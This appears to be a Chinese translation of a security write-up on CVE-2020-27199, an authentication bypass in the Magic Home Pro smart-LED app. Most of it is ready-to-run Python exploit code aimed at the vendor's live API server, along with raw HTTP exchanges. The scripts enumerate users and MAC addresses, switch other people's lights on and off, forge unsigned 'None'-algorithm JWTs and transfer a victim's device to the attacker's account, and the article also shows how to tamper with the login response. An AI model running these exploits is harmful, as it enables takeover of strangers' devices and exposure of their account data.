![](https://image.3001.net/images/20210322/1616400812_605851acaa4d2953eb826.jpg!small)

## 写在前面的话

研究人员近期在Magic Home Pro的移动端应用程序中发现了多个安全漏洞，而这个应用程序的主要功能就是与[
_JadeHomic_](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6)LED
Strip RGB
Kit进行连接。在这些漏洞中，影响最为严重的就是CVE-2020-27199漏洞了，这是一个身份验证绕过漏洞，该漏洞最终将允许攻击者完全接管和控制目标用户的整个设备组。

在这篇文章中，我们将详细讨论关于该漏洞的技术细节，并提供最终的漏洞利用方法以及概念验证PoC材料。

## 前期准备工作

> 一台已Root的Android手机；
>
> JAR重新签名，重新构建APK；
>
> Frida证书绑定绕过；

## 漏洞简报

 **受影响应用：**[ _Magic Home
Pro_](https://play.google.com/store/apps/details?id=com.zengge.wifi&hl=en)

 **产品厂商：**[
_JadeHomic_](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6)

 **WiFi控制器产品厂商：**[ _Suzhou SmartChip Semiconductor
Co.,Ltd_](https://fccid.io/2AKCE)

 **厂商官网：**[
_JadeHomic_](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6)

 **受影响产品代码：**[ _Magic Home
Pro_](https://play.google.com/store/apps/details?id=com.zengge.wifi&hl=en)

## 漏洞介绍

该漏洞将允许任何经过身份验证的用户使用其当前授权级别，通过调用/app/getBindedUserListByMacAddress/ZG001?macAddress=<mac
address> API来查询与其注册产品无关的终端节点。这将导致服务器端返回响应信息
并指示目标节点是否存在，然后返回相关节点的用户名、用户唯一标识符（userUniID）和绑定唯一ID（bindedUniID）。

通过执行上述查询请求，攻击者就可以利用指向/app/sendCommandBatch/ZG001
API的未授权POST请求、新枚举的Mac地址和兼容的十六进制命令71230fa3（ON）及71240fa4（OFF）来向远程节点发送命令了。

## JWT伪造

初始枚举完成后，攻击者还可以使用JWT Payload数据中的userID和uniID伪造JWT，本质上来说应该是可以将令牌降级为使用JWT
Header字段中的“None”算法（签名绕过漏洞）。在该漏洞的帮助下，攻击者将能够通过向/app/shareDevice/ZG001发起远程API调用并使用friendUserID这个JSON参数来将目标设备添加至攻击者的设备列表中，从而实现攻击，此时攻击者将能够完全获取目标设备的控制权限。

## 漏洞类型

> 绕过身份验证
>
> 信息披露
>
> 未经授权的访问
>
> 横向权限提升

## 攻击向量

> 需要经过身份验证的用户
>
> 现有终端系统的成功枚举
>
> 随后将批处理命令发送到远程节点
>
> 设备接管
>
> 绕过身份验证

## 节点枚举和批处理命令漏洞利用PoC

我们的PoC将返回MAC地址范围内的最后字节进行枚举并返回结果，如果你需要的话，你也可以测试“远程执行”的效果。

    
    
    import requests
    
    import json
    
    import os
    
    from colorama import init
    
    from colorama import Fore, Back, Style
    
    import re
    
     
    
    '''
    
    First Stage Authentication
    Second Stage Enumerate
    Third Stage Remote Execute
    
    '''
    
     
    
    global found_macaddresses
    
    found_macaddresses = []
    
    global outtahere
    
    outtahere = ""
    
    q = "q"
    
    global token
    
     
    
     
    
    def turnOn(target, token):
    
     
    
        urlOn = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    
        array = {
    
            "dataCommandItems":[
    
                {"hexData":"71230fa3","macAddress":target}
    
            ]
    
        }
    
        data = json.dumps(array)
    
        headersOn = {
    
            "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
    
            "Accept-Language": "en-US",
    
            "Accept": "application/json",
    
            "Content-Type": "application/json; charset=utf-8",
    
            "token":token,
    
            "Host": "wifij01us.magichue.net",
    
            "Connection": "close",
    
            "Accept-Encoding": "gzip, deflate"
    
        }
    
        print (Fore.WHITE + "[+] Sending Payload ...")
    
        response = requests.post(urlOn, data=data, headers=headersOn)
    
        if response.status_code == 200:
    
            if "true" in response.text:
    
                print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched On")
    
            else:
    
                print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")
    
     
    
    def turnOff(target, token):
    
     
    
        urlOff = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    
        array = {
    
            "dataCommandItems":[
    
                {"hexData":"71240fa4","macAddress":target}
    
            ]
    
        }
    
        data = json.dumps(array)
    
        headersOff = {
    
            "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
    
            "Accept-Language": "en-US",
    
            "Accept": "application/json",
    
            "Content-Type": "application/json; charset=utf-8",
    
            "token":token,
    
            "Host": "wifij01us.magichue.net",
    
            "Connection": "close",
    
            "Accept-Encoding": "gzip, deflate"
    
        }
    
        print (Fore.WHITE + "[+] Sending Payload ...")
    
        response = requests.post(urlOff, data=data, headers=headersOff)
    
        if response.status_code == 200:
    
            if "true" in response.text:
    
                print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched Off")
    
            else:
    
                print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")
    
     
    
    def lighItUp(target, token):
    
     
    
        outtahere = ""
    
        q = "q"
    
        if len(str(target)) < 12:
    
            print (Fore.RED + "[!] Invalid target" + Style.RESET_ALL)
    
        elif re.match('[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}$', target.lower()):
    
            while outtahere.lower() != q.lower():
    
                if outtahere == "0":
    
                    turnOn(target, token)
    
                elif outtahere == "1":
    
                    turnOff(target, token)
    
                outtahere = input(Fore.BLUE + "ON/OFF/QUIT ? (0/1/Q): " + Style.RESET_ALL)
    
     
    
    def Main():
    
        urlAuth = "https://wifij01us.magichue.net/app/login/ZG001"
    
     
    
        data = {
    
            "userID":"<Valid Registered Email/Username>",
    
            "password":"<Valid Registered Password>",
    
            "clientID":""
    
        }
    
     
    
        headersAuth = {
    
            "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
    
            "Accept-Language": "en-US",
    
            "Accept": "application/json",
    
            "Content-Type": "application/json; charset=utf-8",
    
            "Host": "wifij01us.magichue.net",
    
            "Connection": "close",
    
            "Accept-Encoding": "gzip, deflate"
    
        }
    
     
    
        # First Stage Authenticate
    
     
    
        os.system('clear')
    
        print (Fore.WHITE + "[+] Authenticating ...")
    
        response = requests.post(urlAuth, json=data, headers=headersAuth)
    
        resJsonAuth = response.json()
    
        token = (resJsonAuth['token'])
    
     
    
        # Second Stage Enumerate
    
     
    
        print (Fore.WHITE + "[+] Enumerating ...")
    
        macbase = "C82E475DCE"
    
        macaddress = []
    
        a = ["%02d" % x for x in range(100)]
    
        for num in a:
    
            macaddress.append(macbase+num)
    
     
    
        with open('loot.txt', 'w') as f:
    
            for mac in macaddress:
    
                urlEnum = "https://wifij01us.magichue.net/app/getBindedUserListByMacAddress/ZG001"
    
                params = {
    
                    "macAddress":mac
    
                }
    
     
    
                headersEnum = {
    
                    "User-Agent": "Magic Home/1.5.1(ANDROID,9,en-US)",
    
                    "Accept-Language": "en-US",
    
                    "Content-Type": "application/json; charset=utf-8",
    
                    "Accept": "application/json",
    
                    "token": token,
    
                    "Host": "wifij01us.magichue.net",
    
                    "Connection": "close",
    
                    "Accept-Encoding": "gzip, deflate"
    
                }
    
     
    
                response = requests.get(urlEnum, params=params, headers=headersEnum)
    
                resJsonEnum = response.json()
    
                data = (resJsonEnum['data'])
    
                if not data:
    
                    pass
    
                elif data:
    
                    found_macaddresses.append(mac)
    
                    print (Fore.GREEN + "[*] MAC Address Identified: " + Style.RESET_ALL + f"{mac}" + Fore.GREEN + f", User: " + Style.RESET_ALL + f"{(data[0]['userName'])}, " + Fore.GREEN + "Unique ID: " + Style.RESET_ALL + f"{data[0]['userUniID']}, " + Fore.GREEN + "Binded ID: " + Style.RESET_ALL + f"{data[0]['bindedUniID']}")
    
                    f.write(Fore.GREEN + "[*] MAC Address Identified: " + Style.RESET_ALL + f"{mac}" + Fore.GREEN + f", User: " + Style.RESET_ALL + f"{(data[0]['userName'])}, " + Fore.GREEN + "Unique ID: " + Style.RESET_ALL + f"{data[0]['userUniID']}, " + Fore.GREEN + "Binded ID: " + Style.RESET_ALL + f"{data[0]['bindedUniID']}\n")
    
                else:
    
                    print (Fore.RED + "[-] No results found!")
    
                    print(Style.RESET_ALL)
    
     
    
            if not found_macaddresses:
    
                print (Fore.RED + "[-] No MAC addresses retrieved")
    
            elif found_macaddresses:
    
                attackboolean = input(Fore.BLUE + "Would you like to Light It Up ? (y/N): " + Style.RESET_ALL)
    
                if (attackboolean.upper() == 'Y'):
    
                    target = input(Fore.RED + "Enter a target device mac address: " + Style.RESET_ALL)
    
                    lighItUp(target, token)
    
                elif (attackboolean.upper() == 'N'):
    
                    print (Fore.CYAN + "Sometimes, belief isn’t about what we can see. It’s about what we can’t."+ Style.RESET_ALL)
    
                else:
    
                    print (Fore.CYAN + "The human eye is a wonderful device. With a little effort, it can fail to see even the most glaring injustice." + Style.RESET_ALL)
    
     
    
    if __name__ == "__main__":
    
    Main()

## 枚举结果

![](https://image.3001.net/images/20210322/1616400880_605851f08e7cae164d9d8.jpg!small)

## 令牌伪造PoC

攻击者可以使用枚举成功后返回的userID和uniqID，并利用这个令牌伪造PoC来生成一个新的已签名令牌并绕过JWT。

    
    
    #!/usr/local/bin/python3
    
     
    
    import url64
    
    import requests
    
    import json
    
    import sys
    
    import os
    
    from colorama import init
    
    from colorama import Fore, Back, Style
    
    import re
    
    import time
    
    from wsgiref.handlers import format_date_time
    
    from datetime import datetime
    
    from time import mktime
    
     
    
    now = datetime.now()
    
    stamp = mktime(now.timetuple())
    
     
    
    '''
    
    HTTP/1.1 200
    
    Server: nginx/1.10.3
    
    Content-Type: application/json;charset=UTF-8
    
    Connection: close
    
     
    
    "{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http:\/\/wifij01us.magichue.net\/app\/ota\/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\"\",\"userEmail\":\"\",\"userUniID\":\"\"},\"token\":\"\"}"
    
    '''
    
     
    
    def Usage():
    
        print (f"Usage: {sys.argv[0]} <username> <unique id>")
    
     
    
    def Main(user, uniqid):
    
        os.system('clear')
    
        print ("[+] Encoding ...")
    
        print ("[+] Bypass header created!")
    
        print ("HTTP/1.1 200")
    
        print ("Server: nginx/1.10.3")
    
        print ("Date: "+str(format_date_time(stamp))+"")
    
        print ("Content-Type: application/json;charset=UTF-8")
    
        print ("Connection: close\r\n\r\n")
    
     
    
        jwt_header = '{"typ": "JsonWebToken","alg": "None"}'
    
        jwt_data = '{"userID": "'+user+'", "uniID": "'+uniqid+'","cdpid": "ZG001","clientID": "","serverCode": "US","expireDate": 1618264850608,"refreshDate": 1613080850608,"loginDate": 1602712850608}'
    
        jwt_headerEncoded = url64.encode(jwt_header.strip())
    
        jwt_dataEncoded = url64.encode(jwt_data.strip())
    
        jwtcombined = (jwt_headerEncoded.strip()+"."+jwt_dataEncoded.strip()+".")
    
        print ("{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http://wifij01us.magichue.net/app/ota/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\""+user+"\",\"userEmail\":\""+user+"\",\"userUniID\":\""+uniqid+"\"},\"token\":\""+jwtcombined+"\"}")
    
     
    
    if __name__ == "__main__":
    
        if len(sys.argv) < 3:
    
            Usage()
    
        else:
    
            Main(sys.argv[1], sys.argv[2])

## 设备接管PoC

攻击者可以利用该漏洞并使用攻击者的邮件（用于接管目标帐户的注册帐户）、目标用户邮件（要接管的目标帐户）、目标设备Mac地址（与目标电子邮件地址关联）和伪造的令牌来接管目标设备。

    
    
    #!/usr/local/bin/python3
    
     
    
    import url64
    
    import requests
    
    import json
    
    import sys
    
    import os
    
    from colorama import init
    
    from colorama import Fore, Back, Style
    
    import re
    
     
    
    def Usage():
    
        print (f"Usage: {sys.argv[0]} <attacker email> <target email> <target mac address> <target forged token>")
    
     
    
    def Main():
    
     
    
        attacker_email = sys.argv[1]
    
        target_email = sys.argv[2]
    
        target_mac = sys.argv[3]
    
        forged_token = sys.argv[4]
    
     
    
        os.system('clear')
    
        print (Fore.WHITE + "[+] Sending Payload ...")
    
        url = "https://wifij01us.magichue.net/app/shareDevice/ZG001"
    
     
    
        array = {"friendUserID":attacker_email, "macAddress":target_mac}
    
     
    
        data = json.dumps(array)
    
     
    
        headers = {
    
            "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
    
            "Accept-Language": "en-US",
    
            "Accept": "application/json",
    
            "Content-Type": "application/json; charset=utf-8",
    
            "token":forged_token,
    
            "Host": "wifij01us.magichue.net",
    
            "Connection": "close",
    
            "Accept-Encoding": "gzip, deflate"
    
        }
    
        
    
        response = requests.post(url, data=data, headers=headers)
    
        if response.status_code == 200:
    
            if "true" in response.text:
    
                print (Fore.GREEN + "[*] Target is now yours ... " + Style.RESET_ALL)
    
            else:
    
                print (Fore.RED + "[-] Failed to take over target !" + Style.RESET_ALL)
    
     
    
    if __name__ == "__main__":
    
        if len(sys.argv) < 5:
    
            Usage()
    
        else:
    
            Main()

## 成功的POST请求/响应交换样例

    
    
    POST Request
    
     
    
    POST /app/shareDevice/ZG001 HTTP/1.1
    
    User-Agent: Magic Home/1.5.1(ANDROID,9,en-US)
    
    Accept-Language: en-US
    
    Accept: application/json
    
    token: <forged token, representing the target victim>
    
    Content-Type: application/json; charset=utf-8
    
    Content-Length: 72
    
    Host: wifij01us.magichue.net
    
    Connection: close
    
    Accept-Encoding: gzip, deflate
    
     
    
    {"friendUserID":"<attackercontrolled email>","macAddress":"<victim mac address>"}
    
     
    
    Response
    
     
    
    HTTP/1.1 200
    
    Server: nginx/1.10.3
    
    Date: Tue, 07 Jul 2020 05:31:33 GMT
    
    Content-Type: application/json;charset=UTF-8
    
    Connection: close
    
    Content-Length: 31
    
     
    
    {"code":0,"msg":"","data":true}

## 认证绕过（Magic Home Pro）（CVE-2020-27199）

利用JSON令牌伪造以及基于上述枚举的收集信息（即目标用户的电子邮件、ClientID和UniqID），攻击者可以通过篡改HTTP响应绕过移动应用程序的身份验证过程，从而获得应用程序的非授权权限。

攻击者利用目标用户的电子邮件地址、任意密码和客户端来以目标用户身份使用Magic Home Pro应用程序。

然后，攻击者可以使用步骤1中的详细信息操作HTTP响应，该步骤将允许攻击者实现身份认证绕过。

    
    
    Original HTTP Login Request via Magic Home Pro Mobile app
    
     
    
    POST /app/login/ZG001 HTTP/1.1
    
    User-Agent: Magic Home/1.5.1(ANDROID,9,en-US)
    
    Accept-Language: en-US
    
    Accept: application/json
    
    token:
    
    Content-Type: application/json; charset=utf-8
    
    Content-Length: 117
    
    Host: wifij01us.magichue.net
    
    Connection: close
    
    Accept-Encoding: gzip, deflate
    
     
    
    {"userID":"<victim userID>","password":"<arbitrary password>","clientID":"<arbitrary ClientID>"}
    
     
    
    Original HTTP Response
    
     
    
    HTTP/1.1 200
    
    Server: nginx/1.10.3
    
    Date: Thu, 08 Oct 2020 00:08:45 GMT
    
    Content-Type: application/json;charset=UTF-8
    
    Connection: close
    
    Content-Length: 37
    
     
    
    {"code":10033,"msg":"Password error"}
    
     
    
    Edited HTTP Response
    
     
    
    HTTP/1.1 200
    
    Server: nginx/1.10.3
    
    Date: Mon, 06 Jul 2020 12:32:02 GMT
    
    Content-Type: application/json;charset=UTF-8
    
    Connection: close
    
    Content-Length: 907
    
     
    
    {"code":0,"msg":"","data":{"webApi":"wifij01us.magichue.net/app","webPathOta":"http://wifij01us.magichue.net/app/ota/download","tcpServerController":"TCP,8816,ra8816us02.magichue.net","tcpServerBulb":"TCP,8815,ra8815us02.magichue.net","tcpServerControllerOld":"TCP,8806,mhc8806us.magichue.net","tcpServerBulbOld":"TCP,8805,mhb8805us.magichue.net","sslMqttServer":"ssl://192.168.0.112:1883","serverName":"Global","serverCode":"US","userName":"<victim userID>","userEmail":"<victim email>","userUniID":"<uniID gleaned from enumeration>"},"token":"<forged JWT based on gleaned data from API call>"}

## 漏洞利用视频演示

视频地址：[ _https://油guan/2d01JTAiTj4_](https://xn--uvwy13a/2d01JTAiTj4)

## 参考资料

> [ _https://www.amazon.com.au/s?me=A4PYNSFB834M3
> &marketplaceID=A39IBJ37TRP1C6_](https://www.amazon.com.au/s?me=A4PYNSFB834M3&marketplaceID=A39IBJ37TRP1C6)
>
> [ _https://frida.re/﻿_](https://frida.re/)
>
> [ _https://play.google.com/store/apps/details?id=com.zengge.wifi
> &hl=en_](https://play.google.com/store/apps/details?id=com.zengge.wifi&hl=en)
>
> [ _https://fccid.io/2AKCE_](https://fccid.io/2AKCE)
>
> [ _https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2020-27199_](https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2020-27199)
>
> [ _https://www.exploit-db.com/exploits/49266_](https://www.exploit-> db.com/exploits/49266)
>
> [ _https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/magic-> home-pro-mobile-application-authentication-bypass-> cve-2020-27199/_](https://www.trustwave.com/en-> us/resources/blogs/spiderlabs-blog/magic-home-pro-mobile-application-> authentication-bypass-cve-2020-27199/)
>
> [ _https://medium.com/rangeforce/breaking-json-web-> tokens-e11202452bfe_](https://medium.com/rangeforce/breaking-json-web-> tokens-e11202452bfe)
>
> [
> _https://github.com/ticarpi/jwt_tool﻿_](https://github.com/ticarpi/jwt_tool)

